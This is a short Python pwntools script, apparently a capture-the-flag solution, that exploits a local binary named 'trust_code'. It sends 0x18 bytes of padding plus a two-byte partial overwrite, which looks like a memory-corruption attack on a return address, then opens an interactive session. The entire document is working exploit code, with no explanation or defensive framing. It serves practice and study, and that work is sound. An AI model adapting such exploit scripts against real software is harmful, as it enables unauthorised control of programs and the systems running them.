from pwn import *

p = process('./trust_code')
p.sendafter(b'> ', b'A'*0x18+b'\x5a\x16')
p.sendlineafter(b'> ', b'A')
p.interactive()
